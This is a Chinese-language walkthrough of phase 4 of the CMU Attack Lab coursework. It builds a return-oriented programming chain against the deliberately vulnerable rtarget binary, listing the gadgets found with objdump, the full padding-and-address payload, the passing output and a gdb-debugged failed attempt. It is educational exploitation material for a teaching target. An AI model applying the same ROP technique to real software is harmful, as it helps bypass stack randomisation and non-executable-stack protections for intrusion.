# phase4

## 目标

重复 phase2 的攻击，即：

1. 把 cookie 的 value 作为第一个参数
2. 调用 touch2


## 简单分析

跟之前 phase2 不同的是，不能自己注入代码了，因为 rtarget 进行了一些保护措施

1. 采取了栈随机技术，每一次运行时，栈的地址不一样了
2. 限制了可执行代码的区域，即使我们碰巧在栈里注入了代码，也不能执行


所以我们需要使用 ROP(return oriented programming) 的方法进行攻击。
简单来说就是我们不注入自己需要执行的代码，而是在已有的代码中找到我们能够用的指令。
这些指令后面紧跟着 ret，这样我们可以能够在执行完后立即返回到下一个函数。

其实就是手动构造执行栈，栈里的指令地址都是自己”精心挑选“的。

> 只是栈随机了，但是 .text 代码段还是固定的，我们取到的指令地址还是一直可用的。

回归到我们的列子，我们需要找到一些这样可用的代码段(gadgets)，满足以下要求

1. 设置了 rdi 为 cookie 的值 `0x59b997fa`
   1. 可行的指令形式1： `popq %rdi`。
   2. 可行的指令形式2：`mov <>, %rdi`
2. push 了 touch2 的指令地址  `0x4017ec`


```shell
objdump -d rtarget > farm.d
```

至于怎么去搜这些可用的字节序列，需要先想出来你想执行哪些指令，然后在整个 `farm.d` 中搜索。

比如我想执行
```
58 90 popq %rax
c3    retq
```
搜索的字符串就是 `58 90 c3`

能够命中下面的搜索
```d
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq  
```

加上相应偏移得到我们需要的指令处地址(0x4019ca+0x2=0x4019cc)


## 寻找 gadgets

__1. 找到一个指令，能把我们需要的 cookie 值传递到 %rdi。__

可能存在以下两种指令：
```s
mov , %rdi # 第一种方式
pop %rdi # 方式二 查询 pdf 得到其指令字节是 5f
```

根据 attack.pdf 里面提供的字节序列，得到

- **第一种方式：`pop %rdi`** 字节序列是 `5f`，所以我们需要的 gadgets 为 `5f c3`
  ```s
  401419:	69 c0 5f c3 00 00    	imul   $0xc35f,%eax,%eax
  ```
  该段序列不在 farm 允许的操作区内，寻找另外一种方式
- **第二种方式：`mov , %rdi`**，我们需要的 gadgets 为 `48 89` 开头 `c3` 结尾。使用正则 `48 89 .*c3` 查询
  > 查看 《attacklab.pdf》第9页的指令，A. Encodings of movq instructions。查询相关可能序列。 
  ```s
  00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  ```

  有用的序列为 `48 89 c7 c3`，其指令含义为 **`mov %rax, %rdi`**。

  看来，我们还需要把 cookie 的 value 放到 %rax 里才行。这种可能性有两种：
  - 1. `mov $0x59b997fa, %rax`
  - 2. 先手动把立即数 `0x59b997fa` 压栈，然后 `pop %rax`

  第1种，按照立即数 0x59b997fa 没搜到，也不用费心了。试试第二种，可能性更大，需要搜索字节 `58 c3` 来获取 gadgets。这里直接搜不到，搜到了
  ```s
  00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  ```

  经查，90 表示无操作的意思。符合条件。

  **这下明朗了，整体的 ROP 思路是**
  1. push cookie value
  2. pop %rax
  3. mov %rax, %rdi


**2. 将 %rdi 正确设置后，将函数控制权，转移到 touch2**

这个简单，直接把 touch2 地址在栈上写入即可。


所以得到最终构造的字符串

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  /* padding 0x28 = 40 bytes，填充 getbuf 的栈空间，接下来用来 进行 ROP */
cc 19 40 00 00 00 00 00  /* pop %rax 的指令地址 0x4019ca+0x2 = 4019cc */
fa 97 b9 59 00 00 00 00  /* 填充 cookie 值，用于 pop %rax 时返回到 %rax */
a2 19 40 00 00 00 00 00  /* mov %rax, %rdi 指令地址， 0x4019a0+0x2 = 0x4019a2 */
ec 17 40 00 00 00 00 00  /* touch2 */
```


## 题解

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  /* padding 0x28 = 40 bytes，填充 getbuf 的栈空间，接下来用来 进行 ROP */
cc 19 40 00 00 00 00 00  /* pop %rax 的指令地址 0x4019ca+0x2 = 4019cc */
fa 97 b9 59 00 00 00 00  /* 填充 cookie 值，用于 pop %rax 时返回到 %rax */
a2 19 40 00 00 00 00 00  /* mov %rax, %rdi 指令地址， 0x4019a0+0x2 = 0x4019a2 */
ec 17 40 00 00 00 00 00  /* touch2 */
```


```shell
➜  target1 git:(main) ✗ cat ./exploit4.txt | ./hex2raw | ./rtarget -q

Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```


## 附录：失败记录

### 1、第一次计算错了值，~~0x401419+0x2 = 0x40141a~~

> - `pop %rdi` 字节序列是 `5f`，所以我们需要的 gadgets 为 `5f c3`
>
> ```s
> 401419:	69 c0 5f c3 00 00    	imul   $0xc35f,%eax,%eax
> ```
>
> 得到指令地址是 0x401419+0x2 = 0x40141b

上面的失败了，具体情况未知，大概是因为不再 farm 指定的返回内，所以不允许执行。

在 getbuf retq 前，打印相关栈信息

```
# 打印函数栈信息
(gdb) info frame
Stack level 0, frame at 0x7ffffffcf620:
 rip = 0x4017bd in getbuf (buf.c:16); saved rip = 0x40141a
 called by frame at 0x7ffffffcf628
 source language c.
 Arglist at 0x7ffffffcf610, args: 
 Locals at 0x7ffffffcf610, Previous frame's sp is 0x7ffffffcf620
 Saved registers:
  rip at 0x7ffffffcf618


# 打印上述 rip 的栈地址，即 ret 后需要执行的指令，存在栈的什么地方
(gdb) x *0x7ffffffcf618
0x40141a <scramble+146>:        0xc0


# 打印栈储存的返回值地址，我们发现和我们预期的 5fc3 差了一个字节
(gdb) x/10x 0x40141a
0x40141a <scramble+146>:        0xc0    0x5f    0xc3    0x00    0x00    0x89    0x44    0x24
0x401422 <scramble+154>:        0xc8    0x8b
```

